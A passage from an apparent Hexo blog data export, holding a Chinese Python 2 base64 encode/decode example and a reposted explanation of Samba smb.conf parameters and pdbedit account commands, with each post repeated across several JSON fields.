16:25:00\n---\n<p>1.最简单的加解密实例，字符串</p><p>import&nbsp;base64&nbsp; </p><p>str1&nbsp;= ‘hello'</p><p>print str1</p><p>str2&nbsp;=&nbsp;base64.b64encode(str1) <br /></p><p>print str2<br /></p><p>str3&nbsp;=&nbsp;base64.b64decode(str2) <br /></p><p>print str3</p><p><br /></p><p>2.针对文件加解密</p><p>import base64</p><p>f1=open('1.txt','r')</p><p>f2=open('2.txt','w')<br /></p><p>base64.encode(f1,f2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #加密,把f1的内容加密后写入f2</p><p>#base64.decode(f1,f2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #解密,把f1的内容解密后写入f2</p><p>f1.close()</p><p>f2.close()</p><p><br /></p>","slug":"python-使用base64加解密","published":1,"updated":"2023-04-22T05:38:44.893Z","_id":"clgrjlxj2006c7opi0ffp71nz","comments":1,"layout":"post","photos":[],"link":"","content":"<p>1.最简单的加解密实例，字符串</p><p>import&nbsp;base64&nbsp; </p><p>str1&nbsp;= ‘hello'</p><p>print str1</p><p>str2&nbsp;=&nbsp;base64.b64encode(str1) <br /></p><p>print str2<br /></p><p>str3&nbsp;=&nbsp;base64.b64decode(str2) <br /></p><p>print str3</p><p><br /></p><p>2.针对文件加解密</p><p>import base64</p><p>f1=open('1.txt','r')</p><p>f2=open('2.txt','w')<br /></p><p>base64.encode(f1,f2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #加密,把f1的内容加密后写入f2</p><p>#base64.decode(f1,f2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #解密,把f1的内容解密后写入f2</p><p>f1.close()</p><p>f2.close()</p><p><br /></p>","site":{"data":{}},"excerpt":"","more":"<p>1.最简单的加解密实例，字符串</p><p>import&nbsp;base64&nbsp; </p><p>str1&nbsp;= ‘hello'</p><p>print str1</p><p>str2&nbsp;=&nbsp;base64.b64encode(str1) <br /></p><p>print str2<br /></p><p>str3&nbsp;=&nbsp;base64.b64decode(str2) <br /></p><p>print str3</p><p><br /></p><p>2.针对文件加解密</p><p>import base64</p><p>f1=open('1.txt','r')</p><p>f2=open('2.txt','w')<br /></p><p>base64.encode(f1,f2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #加密,把f1的内容加密后写入f2</p><p>#base64.decode(f1,f2)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; #解密,把f1的内容解密后写入f2</p><p>f1.close()</p><p>f2.close()</p><p><br /></p>"},{"title":"Samba配置文件常用参数详解","date":"2010-05-30T02:41:00.000Z","_content":"转自 : <a href=\"http://yuanbin.blog.51cto.com/363003/115761\">http://yuanbin.blog.51cto.com/363003/115761</a><br />Samba的主配置文件叫smb.conf，默认在/etc/samba /目录下。smb.conf含有多个段，每个段由段名开始，直到下个段名。每个段名放 在方括号中间。每段的参数的格式是：名称=指。配置文件中一行一个段名和参数，段名和参数名不分大小写。除了[global]段外，所有的段都可以看作是一个共享资源。段名是该共 享资源的名字，段里的参数是该共享资源的属性。Samba安装好后，使用testparm命令可以测试smb.conf配 置是否正确。使用<strong>testparm –v</strong>命令可以详细的列出smb.conf支持的配置参数。 <strong>全局参数：</strong>==================Global Settings  ===================<strong>[global]</strong> <strong>config file =  /usr/local/samba/lib/smb.conf.%m</strong>说明：config  file可以让你使用另一个配置文件来覆盖缺省的配置文件。如果文件  不存在，则该项无效。这个参数很有用，可以使得samba配置更灵活，可以让一台samba服务器模拟多台不同配置的服务器。比如，你想让PC1（主机 名）这台电脑在访问Samba  Server时使用它自己的配置文件，那么先在/etc/samba/host/下为PC1配置一个名为smb.conf.pc1的文件，然后在 smb.conf中加入：config file = /etc/samba/host/smb.conf.%m。这样当PC1请求连接Samba  Server时，smb.conf.%m就被替换成smb.conf.pc1。这样，对于PC1来说，它所使用的Samba服务就是由 smb.conf.pc1定义的，而其他机器访问Samba Server则还是应用smb.conf。 <strong>workgroup = WORKGROUP </strong>说明：设定 Samba Server 所要加入的工作组或者域。 <strong>server string = Samba  Server Version %v</strong>说明：设定 Samba Server  的注释，可以是任何字符串，也可以不填。宏%v表示显示Samba的版本号。 <strong>netbios name = smbserver</strong>说明：设置Samba  Server的NetBIOS名称。如果不填，则默认会使用该服务器的DNS名称的第一部分。netbios  name和workgroup名字不要设置成一样了。 <strong>interfaces = lo eth0  192.168.12.2/24 192.168.13.2/24 </strong>说明：设置Samba  Server监听哪些网卡，可以写网卡名，也可以写该网卡的IP地址。 <strong>hosts allow = 127.  192.168.1. 192.168.10.1</strong>说明：表示允许连接到Samba  Server的客户端，多个参数以空格隔开。可以用一个IP表示，也可以用一个网段表示。hosts deny 与hosts allow 刚好相反。例如：hosts  allow=172.17.2.EXCEPT172.17.2.50表示容许来自172.17.2.*.*的主机连接，但排除 172.17.2.50hosts allow=172.17.2.0/255.255.0.0表示容许来自172.17.2.0/255.255.0.0子网中的所有主 机连接hosts allow=M1，M2表示容许来自M1和M2两台计算机连接hosts allow=@xq表示容许来自XQ网域的所有计算机连接 <strong>max connections = 0</strong>说明：max connections用来指定连接Samba  Server的最大连接数目。如果超出连接数目，则新的连接请求将被拒绝。0表示不限制。 <strong>deadtime = 0</strong>说明：deadtime用来设置断掉一个没有打开任何文件的连接的时间。单 位是分钟，0代表Samba Server不自动切断任何连接。 <strong>time server = yes/no</strong>说明：time  server用来设置让nmdb成为windows客户端的时间服务器。 <strong>log file =  /var/log/samba/log.%m</strong>说明：设置Samba  Server日志文件的存储位置以及日志文件名称。在文件名后加个宏%m（主机名），表示对每台访问Samba  Server的机器都单独记录一个日志文件。如果pc1、pc2访问过Samba  Server，就会在/var/log/samba目录下留下log.pc1和log.pc2两个日志文件。 <strong>max log size = 50</strong>说明：设置Samba  Server日志文件的最大容量，单位为kB，0代表不限制。 <strong>security = user </strong>说明：设置用户访问Samba  Server的验证方式，一共有四种验证方式。<strong>1. </strong><strong>share</strong><strong>：</strong>用 户访问Samba Server不需要提供用户名和口令, 安全性能较低。<strong>2. </strong><strong>user：</strong>Samba  Server共享目录只能被授权的用户访问,由Samba Server负责检查账号和密码的正确性。账号和密码要在本Samba  Server中建立。<strong>3. </strong><strong>server：</strong>依 靠其他Windows NT/2000或Samba  Server来验证用户的账号和密码,是一种代理验证。此种安全模式下,系统管理员可以把所有的Windows用户和口令集中到一个NT系统上,使用 Windows NT进行Samba认证, 远程服务器可以自动认证全部用户和口令,如果认证失败,Samba将使用用户级安全模式作为替代的方式。<strong>4. </strong><strong>domain：</strong>域 安全级别,使用主域控制器(PDC)来完成认证。 <strong>passdb backend = tdbsam</strong>说明：passdb  backend就是用户后台的意思。目前有三种后台：smbpasswd、tdbsam和ldapsam。sam应该是security account  manager（安全账户管理）的简写。<strong>1.smbpasswd：</strong>该方式是使用 smb自己的工具smbpasswd来给系统用户（真实用户或者虚拟用户）设置一个Samba密码，客户端就用这个密码来访问 Samba的资源。smbpasswd文件默认在/etc/samba目录下，不过有时候要手工建立该文件。<strong>2.tdbsam</strong><strong>：</strong>该 方式则是使用一个数据库文件来建立用户数据库。数据库文件叫passdb.tdb，默认在/etc/samba目录下。passdb.tdb用户数据库可 以使用smbpasswd –a来建立Samba用户，不过要建立的Samba用户必须先是系统用户。我们也可以使用<strong>pdbedit</strong>命 令来建立Samba账户。pdbedit命令的参数很多，我们列出几个主要的。pdbedit –a username：新建Samba账户。pdbedit –x username：删除Samba账户。pdbedit  –L：列出Samba用户列表，读取passdb.tdb数据库文件。pdbedit –Lv：列出Samba用户列表的详细信息。pdbedit –c “[D]” –u  username：暂停该Samba用户的账号。pdbedit –c “[]” –u  username：恢复该Samba用户的账号。<strong>3.ldapsam</strong><strong>：</strong>该 方式则是基于LDAP的账户管理方式来验证用户。首先要建立LDAP服务，然后设置“passdb backend =  ldapsam:ldap://LDAP Server” <strong>encrypt passwords = yes/no</strong>说明：是否将认证密码加密。因为现在windows操作系统都是使用加密密 码，所以一般要开启此项。不过配置文件默认已开启。 <strong>smb passwd file =  /etc/samba/smbpasswd</strong>说明：用来定义samba用户的密码文件。smbpasswd文件如果没有 那就要手工新建。 <strong>username map =  /etc/samba/smbusers</strong>说明：用来定义用户名映射，比如可以将root换成 administrator、admin等。不过要事先在smbusers文件中定义好。比如：root = administrator  admin，这样就可以用administrator或admin这两个用户来代替root登陆Samba  Server，更贴近windows用户的习惯。 <strong>guest account = nobody</strong>说明：用来设置guest用户名。 <strong>socket options =  TCP_NODELAY SO_RCVBUF=8192 SO_SNDBUF=8192</strong>说明：用来设置服务器和客户端之间会话的Socket选项，可以优化传输速 度。 <strong>domain master = yes/no </strong>说明：设置Samba服务器是否要成为网域主浏览器，网域主浏览器可以管理 跨子网域的浏览服务。 <strong>local master = yes/no</strong>说明：local master用来指定Samba  Server是否试图成为本地网域主浏览器。如果设为no，则永远不会成为本地网域主浏览器。但是即使设置为yes，也不等于该Samba  Server就能成为主浏览器，还需要参加选举。 <strong>preferred master = yes/no</strong>说明：设置Samba  Server一开机就强迫进行主浏览器选举，可以提高Samba  Server成为本地网域主浏览器的机会。如果该参数指定为yes时\n","source":"_posts/Samba配置文件常用参数详解.md","raw":"title: Samba配置文件常用参数详解\ncategories: [Linux]\ntags: []\ndate: 2010-05-30 10:41:00\n---\n转自 : <a href=\"http://yuanbin.blog.51cto.com/363003/115761\">http://yuanbin.blog.51cto.com/363003/115761</a><br />Samba的主配置文件叫smb.conf，默认在/etc/samba /目录下。smb.conf含有多个段，每个段由段名开始，直到下个段名。每个段名放 在方括号中间。每段的参数的格式是：名称=指。配置文件中一行一个段名和参数，段名和参数名不分大小写。除了[global]段外，所有的段都可以看作是一个共享资源。段名是该共 享资源的名字，段里的参数是该共享资源的属性。Samba安装好后，使用testparm命令可以测试smb.conf配 置是否正确。使用<strong>testparm –v</strong>命令可以详细的列出smb.conf支持的配置参数。 <strong>全局参数：</strong>==================Global Settings  ===================<strong>[global]</strong> <strong>config file =  /usr/local/samba/lib/smb.conf.%m</strong>说明：config  file可以让你使用另一个配置文件来覆盖缺省的配置文件。如果文件  不存在，则该项无效。这个参数很有用，可以使得samba配置更灵活，可以让一台samba服务器模拟多台不同配置的服务器。比如，你想让PC1（主机 名）这台电脑在访问Samba  Server时使用它自己的配置文件，那么先在/etc/samba/host/下为PC1配置一个名为smb.conf.pc1的文件，然后在 smb.conf中加入：config file = /etc/samba/host/smb.conf.%m。这样当PC1请求连接Samba  Server时，smb.conf.%m就被替换成smb.conf.pc1。这样，对于PC1来说，它所使用的Samba服务就是由 smb.conf.pc1定义的，而其他机器访问Samba Server则还是应用smb.conf。 <strong>workgroup = WORKGROUP </strong>说明：设定 Samba Server 所要加入的工作组或者域。 <strong>server string = Samba  Server Version %v</strong>说明：设定 Samba Server  的注释，可以是任何字符串，也可以不填。宏%v表示显示Samba的版本号。 <strong>netbios name = smbserver</strong>说明：设置Samba  Server的NetBIOS名称。如果不填，则默认会使用该服务器的DNS名称的第一部分。netbios  name和workgroup名字不要设置成一样了。 <strong>interfaces = lo eth0  192.168.12.2/24 192.168.13.2/24 </strong>说明：设置Samba  Server监听哪些网卡，可以写网卡名，也可以写该网卡的IP地址。 <strong>hosts allow = 127.  192.168.1. 192.168.10.1</strong>说明：表示允许连接到Samba  Server的客户端，多个参数以空格隔开。可以用一个IP表示，也可以用一个网段表示。hosts deny 与hosts allow 刚好相反。例如：hosts  allow=172.17.2.EXCEPT172.17.2.50表示容许来自172.17.2.*.*的主机连接，但排除 172.17.2.50hosts allow=172.17.2.0/255.255.0.0表示容许来自172.17.2.0/255.255.0.0子网中的所有主 机连接hosts allow=M1，M2表示容许来自M1和M2两台计算机连接hosts allow=@xq表示容许来自XQ网域的所有计算机连接 <strong>max connections = 0</strong>说明：max connections用来指定连接Samba  Server的最大连接数目。如果超出连接数目，则新的连接请求将被拒绝。0表示不限制。 <strong>deadtime = 0</strong>说明：deadtime用来设置断掉一个没有打开任何文件的连接的时间。单 位是分钟，0代表Samba Server不自动切断任何连接。 <strong>time server = yes/no</strong>说明：time  server用来设置让nmdb成为windows客户端的时间服务器。 <strong>log file =  /var/log/samba/log.%m</strong>说明：设置Samba  Server日志文件的存储位置以及日志文件名称。在文件名后加个宏%m（主机名），表示对每台访问Samba  Server的机器都单独记录一个日志文件。如果pc1、pc2访问过Samba  Server，就会在/var/log/samba目录下留下log.pc1和log.pc2两个日志文件。 <strong>max log size = 50</strong>说明：设置Samba  Server日志文件的最大容量，单位为kB，0代表不限制。 <strong>security = user </strong>说明：设置用户访问Samba  Server的验证方式，一共有四种验证方式。<strong>1. </strong><strong>share</strong><strong>：</strong>用 户访问Samba Server不需要提供用户名和口令, 安全性能较低。<strong>2. </strong><strong>user：</strong>Samba  Server共享目录只能被授权的用户访问,由Samba Server负责检查账号和密码的正确性。账号和密码要在本Samba  Server中建立。<strong>3. </strong><strong>server：</strong>依 靠其他Windows NT/2000或Samba  Server来验证用户的账号和密码,是一种代理验证。此种安全模式下,系统管理员可以把所有的Windows用户和口令集中到一个NT系统上,使用 Windows NT进行Samba认证, 远程服务器可以自动认证全部用户和口令,如果认证失败,Samba将使用用户级安全模式作为替代的方式。<strong>4. </strong><strong>domain：</strong>域 安全级别,使用主域控制器(PDC)来完成认证。 <strong>passdb backend = tdbsam</strong>说明：passdb  backend就是用户后台的意思。目前有三种后台：smbpasswd、tdbsam和ldapsam。sam应该是security account  manager（安全账户管理）的简写。<strong>1.smbpasswd：</strong>该方式是使用 smb自己的工具smbpasswd来给系统用户（真实用户或者虚拟用户）设置一个Samba密码，客户端就用这个密码来访问 Samba的资源。smbpasswd文件默认在/etc/samba目录下，不过有时候要手工建立该文件。<strong>2.tdbsam</strong><strong>：</strong>该 方式则是使用一个数据库文件来建立用户数据库。数据库文件叫passdb.tdb，默认在/etc/samba目录下。passdb.tdb用户数据库可 以使用smbpasswd –a来建立Samba用户，不过要建立的Samba用户必须先是系统用户。我们也可以使用<strong>pdbedit</strong>命 令来建立Samba账户。pdbedit命令的参数很多，我们列出几个主要的。pdbedit –a username：新建Samba账户。pdbedit –x username：删除Samba账户。pdbedit  –L：列出Samba用户列表，读取passdb.tdb数据库文件。pdbedit –Lv：列出Samba用户列表的详细信息。pdbedit –c “[D]” –u  username：暂停该Samba用户的账号。pdbedit –c “[]” –u  username：恢复该Samba用户的账号。<strong>3.ldapsam</strong><strong>：</strong>该 方式则是基于LDAP的账户管理方式来验证用户。首先要建立LDAP服务，然后设置“passdb backend =  ldapsam:ldap://LDAP Server” <strong>encrypt passwords = yes/no</strong>说明：是否将认证密码加密。因为现在windows操作系统都是使用加密密 码，所以一般要开启此项。不过配置文件默认已开启。 <strong>smb passwd file =  /etc/samba/smbpasswd</strong>说明：用来定义samba用户的密码文件。smbpasswd文件如果没有 那就要手工新建。 <strong>username map =  /etc/samba/smbusers</strong>说明：用来定义用户名映射，比如可以将root换成 administrator、admin等。不过要事先在smbusers文件中定义好。比如：root = administrator  admin，这样就可以用administrator或admin这两个用户来代替root登陆Samba  Server，更贴近windows用户的习惯。 <strong>guest account = nobody</strong>说明：用来设置guest用户名。 <strong>socket options =  TCP_NODELAY SO_RCVBUF=8192 SO_SNDBUF=8192</strong>说明：用来设置服务器和客户端之间会话的Socket选项，可以优化传输速 度。 <strong>domain master = yes/no </strong>说明：设置Samba服务器是否要成为网域主浏览器，网域主浏览器可以管理 跨子网域的浏览服务。 <strong>local master = yes/no</strong>说明：local master用来指定Samba  Server是否试图成为本地网域主浏览器。如果设为no，则永远不会成为本地网域主浏览器。但是即使设置为yes，也不等于该Samba  Server就能成为主浏览器，还需要参加选举。 <strong>preferred master = yes/no</strong>说明：设置Samba  Server一开机就强迫进行主浏览器选举，可以提高Samba  Server成为本地网域主浏览器的机会。如果该参数指定为yes时\n","slug":"Samba配置文件常用参数详解","published":1,"updated":"2023-04-22T05:38:44.693Z","_id":"clgrjlxj3006d7opi3bo2dqx3","comments":1,"layout":"post","photos":[],"link":"","content":"<p>转自 : <a href=\"http://yuanbin.blog.51cto.com/363003/115761\">http://yuanbin.blog.51cto.com/363003/115761</a><br />Samba的主配置文件叫smb.conf，默认在&#x2F;etc&#x2F;samba &#x2F;目录下。smb.conf含有多个段，每个段由段名开始，直到下个段名。每个段名放 在方括号中间。每段的参数的格式是：名称&#x3D;指。配置文件中一行一个段名和参数，段名和参数名不分大小写。除了[global]段外，所有的段都可以看作是一个共享资源。段名是该共 享资源的名字，段里的参数是该共享资源的属性。Samba安装好后，使用testparm命令可以测试smb.conf配 置是否正确。使用<strong>testparm –v</strong>命令可以详细的列出smb.conf支持的配置参数。 <strong>全局参数：</strong>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Global Settings  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<strong>[global]</strong> <strong>config file &#x3D;  &#x2F;usr&#x2F;local&#x2F;samba&#x2F;lib&#x2F;smb.conf.%m</strong>说明：config  file可以让你使用另一个配置文件来覆盖缺省的配置文件。如果文件  不存在，则该项无效。这个参数很有用，可以使得samba配置更灵活，可以让一台samba服务器模拟多台不同配置的服务器。比如，你想让PC1（主机 名）这台电脑在访问Samba  Server时使用它自己的配置文件，那么先在&#x2F;etc&#x2F;samba&#x2F;host&#x2F;下为PC1配置一个名为smb.conf.pc1的文件，然后在 smb.conf中加入：config file &#x3D; &#x2F;etc&#x2F;samba&#x2F;host&#x2F;smb.conf.%m。这样当PC1请求连接Samba  Server时，smb.conf.%m就被替换成smb.conf.pc1。这样，对于PC1来说，它所使用的Samba服务就是由 smb.conf.pc1定义的，而其他机器访问Samba Server则还是应用smb.conf。 <strong>workgroup &#x3D; WORKGROUP </strong>说明：设定 Samba Server 所要加入的工作组或者域。 <strong>server string &#x3D; Samba  Server Version %v</strong>说明：设定 Samba Server  的注释，可以是任何字符串，也可以不填。宏%v表示显示Samba的版本号。 <strong>netbios name &#x3D; smbserver</strong>说明：设置Samba  Server的NetBIOS名称。如果不填，则默认会使用该服务器的DNS名称的第一部分。netbios  name和workgroup名字不要设置成一样了。 <strong>interfaces &#x3D; lo eth0  192.168.12.2&#x2F;24 192.168.13.2&#x2F;24 </strong>说明：设置Samba  Server监听哪些网卡，可以写网卡名，也可以写该网卡的IP地址。 <strong>hosts allow &#x3D; 127.  192.168.1. 192.168.10.1</strong>说明：表示允许连接到Samba  Server的客户端，多个参数以空格隔开。可以用一个IP表示，也可以用一个网段表示。hosts deny 与hosts allow 刚好相反。例如：hosts  allow&#x3D;172.17.2.EXCEPT172.17.2.50表示容许来自172.17.2.*.*的主机连接，但排除 172.17.2.50hosts allow&#x3D;172.17.2.0&#x2F;255.255.0.0表示容许来自172.17.2.0&#x2F;255.255.0.0子网中的所有主 机连接hosts allow&#x3D;M1，M2表示容许来自M1和M2两台计算机连接hosts allow&#x3D;@xq表示容许来自XQ网域的所有计算机连接 <strong>max connections &#x3D; 0</strong>说明：max connections用来指定连接Samba  Server的最大连接数目。如果超出连接数目，则新的连接请求将被拒绝。0表示不限制。 <strong>deadtime &#x3D; 0</strong>说明：deadtime用来设置断掉一个没有打开任何文件的连接的时间。单 位是分钟，0代表Samba Server不自动切断任何连接。 <strong>time server &#x3D; yes&#x2F;no</strong>说明：time  server用来设置让nmdb成为windows客户端的时间服务器。 <strong>log file &#x3D;  &#x2F;var&#x2F;log&#x2F;samba&#x2F;log.%m</strong>说明：设置Samba  Server日志文件的存储位置以及日志文件名称。在文件名后加个宏%m（主机名），表示对每台访问Samba  Server的机器都单独记录一个日志文件。如果pc1、pc2访问过Samba  Server，就会在&#x2F;var&#x2F;log&#x2F;samba目录下留下log.pc1和log.pc2两个日志文件。 <strong>max log size &#x3D; 50</strong>说明：设置Samba  Server日志文件的最大容量，单位为kB，0代表不限制。 <strong>security &#x3D; user </strong>说明：设置用户访问Samba  Server的验证方式，一共有四种验证方式。<strong>1. </strong><strong>share</strong><strong>：</strong>用 户访问Samba Server不需要提供用户名和口令, 安全性能较低。<strong>2. </strong><strong>user：</strong>Samba  Server共享目录只能被授权的用户访问,由Samba Server负责检查账号和密码的正确性。账号和密码要在本Samba  Server中建立。<strong>3. </strong><strong>server：</strong>依 靠其他Windows NT&#x2F;2000或Samba  Server来验证用户的账号和密码,是一种代理验证。此种安全模式下,系统管理员可以把所有的Windows用户和口令集中到一个NT系统上,使用 Windows NT进行Samba认证, 远程服务器可以自动认证全部用户和口令,如果认证失败,Samba将使用用户级安全模式作为替代的方式。<strong>4. </strong><strong>domain：</strong>域 安全级别,使用主域控制器(PDC)来完成认证。 <strong>passdb backend &#x3D; tdbsam</strong>说明：passdb  backend就是用户后台的意思。目前有三种后台：smbpasswd、tdbsam和ldapsam。sam应该是security account  manager（安全账户管理）的简写。<strong>1.smbpasswd：</strong>该方式是使用 smb自己的工具smbpasswd来给系统用户（真实用户或者虚拟用户）设置一个Samba密码，客户端就用这个密码来访问 Samba的资源。smbpasswd文件默认在&#x2F;etc&#x2F;samba目录下，不过有时候要手工建立该文件。<strong>2.tdbsam</strong><strong>：</strong>该 方式则是使用一个数据库文件来建立用户数据库。数据库文件叫passdb.tdb，默认在&#x2F;etc&#x2F;samba目录下。passdb.tdb用户数据库可 以使用smbpasswd –a来建立Samba用户，不过要建立的Samba用户必须先是系统用户。我们也可以使用<strong>pdbedit</strong>命 令来建立Samba账户。pdbedit命令的参数很多，我们列出几个主要的。pdbedit –a username：新建Samba账户。pdbedit –x username：删除Samba账户。pdbedit  –L：列出Samba用户列表，读取passdb.tdb数据库文件。pdbedit –Lv：列出Samba用户列表的详细信息。pdbedit –c “[D]” –u  username：暂停该Samba用户的账号。pdbedit –c “[]” –u  username：恢复该Samba用户的账号。<strong>3.ldapsam</strong><strong>：</strong>该 方式则是基于LDAP的账户管理方式来验证用户。首先要建立LDAP服务，然后设置“passdb backend &#x3D;  ldapsam:ldap:&#x2F;&#x2F;LDAP Server” <strong>encrypt passwords &#x3D; yes&#x2F;no</strong>说明：是否将认证密码加密。因为现在windows操作系统都是使用加密密 码，所以一般要开启此项。不过配置文件默认已开启。 <strong>smb passwd file &#x3D;  &#x2F;etc&#x2F;samba&#x2F;smbpasswd</strong>说明：用来定义samba用户的密码文件。smbpasswd文件如果没有 那就要手工新建。 <strong>username map &#x3D;  &#x2F;etc&#x2F;samba&#x2F;smbusers</strong>说明：用来定义用户名映射，比如可以将root换成 administrator、admin等。不过要事先在smbusers文件中定义好。比如：root &#x3D; administrator  admin，这样就可以用administrator或admin这两个用户来代替root登陆Samba  Server，更贴近windows用户的习惯。 <strong>guest account &#x3D; nobody</strong>说明：用来设置guest用户名。 <strong>socket options &#x3D;  TCP_NODELAY SO_RCVBUF&#x3D;8192 SO_SNDBUF&#x3D;8192</strong>说明：用来设置服务器和客户端之间会话的Socket选项，可以优化传输速 度。 <strong>domain master &#x3D; yes&#x2F;no </strong>说明：设置Samba服务器是否要成为网域主浏览器，网域主浏览器可以管理 跨子网域的浏览服务。 <strong>local master &#x3D; yes&#x2F;no</strong>说明：local master用来指定Samba  Server是否试图成为本地网域主浏览器。如果设为no，则永远不会成为本地网域主浏览器。但是即使设置为yes，也不等于该Samba  Server就能成为主浏览器，还需要参加选举。 <strong>preferred master &#x3D; yes&#x2F;no</strong>说明：设置Samba  Server一开机就强迫进行主浏览器选举，可以提高Samba  Server成为本地网域主浏览器的机会。如果该参数指定为yes时</p>\n","site":{"data":{}},"excerpt":"","more":"<p>转自 : <a href=\"http://yuanbin.blog.51cto.com/363003/115761\">http://yuanbin.blog.51cto.com/363003/115761</a><br />Samba的主配置文件叫smb.conf，默认在&#x2F;etc&#x2F;samba &#x2F;目录下。smb.conf含有多个段，每个段由段名开始，直到下个段名。每个段名放 在方括号中间。每段的参数的格式是：名称&#x3D;指。配置文件中一行一个段名和参数，段名和参数名不分大小写。除了[global]段外，所有的段都可以看作是一个共享资源。段名是该共 享资源的名字，段里的参数是该共享资源的属性。Samba安装好后，使用testparm命令可以测试smb.conf配 置是否正确。使用<strong>testparm –v</strong>命令可以详细的列出smb.conf支持的配置参数。 <strong>全局参数：</strong>&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Global Settings  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;<strong>[global]</strong> <strong>config file &#x3D;  &#x2F;usr&#x2F;local&#x2F;samba&#x2F;lib&#x2F;smb.conf.%m</strong>说明：config  file可以让你使用另一个配置文件来覆盖缺省的配置文件。如果文件  不存在，则该项无效。这个参数很有用，可以使得samba配置更灵活，可以让一台samba服务器模拟多台不同配置的服务器。比如，你想让PC1（主机 名）这台电脑在访问Samba  Server时使用它自己的配置文件，那么先在&#x2F;etc&#x2F;samba&#x2F;host&#x2F;下为PC1配置一个名为smb.conf.pc1的文件，然后在 smb.conf中加入：config file &#x3D; &#x2F;etc&#x2F;samba&#x2F;host&#x2F;smb.conf.%m。这样当PC1请求连接Samba  Server时，smb.conf.%m就被替换成smb.conf.pc1。这样，对于PC1来说，它所使用的Samba服务就是由 smb.conf.pc1定义的，而其他机器访问Samba Server则还是应用smb.conf。 <strong>workgroup &#x3D; WORKGROUP </strong>说明：设定 Samba Server 所要加入的工作组或者域。 <strong>server string &#x3D; Samba  Server Version %v</strong>说明：设定 Samba Server  的注释，可以是任何字符串，也可以不填。宏%v表示显示Samba的版本号。 <strong>netbios name &#x3D; smbserver</strong>说明：设置Samba  Server的NetBIOS名称。如果不填，则默认会使用该服务器的DNS名称的第一部分。netbios  name和workgroup名字不要设置成一样了。 <strong>interfaces &#x3D; lo eth0  192.168.12.2&#x2F;24 192.168.13.2&#x2F;24 </strong>说明：设置Samba  Server监听哪些网卡，可以写网卡名，也可以写该网卡的IP地址。 <strong>hosts allow &#x3D; 127.  192.168.1. 192.168.10.1</strong>说明：表示允许连接到Samba  Server的客户端，多个参数以空格隔开。可以用一个IP表示，也可以用一个网段表示。hosts deny 与hosts allow 刚好相反。例如：hosts  allow&#x3D;172.17.2.EXCEPT172.17.2.50表示容许来自172.17.2.*.*的主机连接，但排除 172.17.2.50hosts allow&#x3D;172.17.2.0&#x2F;255.255.0.0表示容许来自172.17.2.0&#x2F;255.255.0.0子网中的所有主 机连接hosts allow&#x3D;M1，M2表示容许来自M1和M2两台计算机连接hosts allow&#x3D;@xq表示容许来自XQ网域的所有计算机连接 <strong>max connections &#x3D; 0</strong>说明：max connections用来指定连接Samba  Server的最大连接数目。如果超出连接数目，则新的连接请求将被拒绝。0表示不限制。 <strong>deadtime &#x3D; 0</strong>说明：deadtime用来设置断掉一个没有打开任何文件的连接的时间。单 位是分钟，0代表Samba Server不自动切断任何连接。 <strong>time server &#x3D; yes&#x2F;no</strong>说明：time  server用来设置让nmdb成为windows客户端的时间服务器。 <strong>log file &#x3D;  &#x2F;var&#x2F;log&#x2F;samba&#x2F;log.%m</strong>说明：设置Samba  Server日志文件的存储位置以及日志文件名称。在文件名后加个宏%m（主机名），表示对每台访问Samba  Server的机器都单独记录一个日志文件。如果pc1、pc2访问过Samba  Server，就会在&#x2F;var&#x2F;log&#x2F;samba目录下留下log.pc1和log.pc2两个日志文件。 <strong>max log size &#x3D; 50</strong>说明：设置Samba  Server日志文件的最大容量，单位为kB，0代表不限制。 <strong>security &#x3D; user </strong>说明：设置用户访问Samba  Server的验证方式，一共有四种验证方式。<strong>1. </strong><strong>share</strong><strong>：</strong>用 户访问Samba Server不需要提供用户名和口令, 安全性能较低。<strong>2. </strong><strong>user：</strong>Samba  Server共享目录只能被授权的用户访问,由Samba Server负责检查账号和密码的正确性。账号和密码要在本Samba  Server中建立。<strong>3. </strong><strong>server：</strong>依 靠其他Windows NT&#x2F;2000或Samba  Server来验证用户的账号和密码,是一种代理验证。此种安全模式下,系统管理员可以把所有的Windows用户和口令集中到一个NT系统上,使用 Windows NT进行Samba认证, 远程服务器可以自动认证全部用户和口令,如果认证失败,Samba将使用用户级安全模式作为替代的方式。<strong>4. </strong><strong>domain：</strong>域 安全级别,使用主域控制器(PDC)来完成认证。 <strong>passdb backend &#x3D; tdbsam</strong>说明：passdb  backend就是用户后台的意思。目前有三种后台：smbpasswd、tdbsam和ldapsam。sam应该是security account  manager（安全账户管理）的简写。<strong>1.smbpasswd：</strong>该方式是使用 smb自己的工具smbpasswd来给系统用户（真实用户或者虚拟用户）设置一个Samba密码，客户端就用这个密码来访问 Samba的资源。smbpasswd文件默认在&#x2F;etc&#x2F;samba目录下，不过有时候要手工建立该文件。<strong>2.tdbsam</strong><strong>：</strong>该 方式则是使用一个数据库文件来建立用户数据库。数据库文件叫passdb.tdb，默认在&#x2F;etc&#x2F;samba目录下。passdb.tdb用户数据库可 以使用smbpasswd 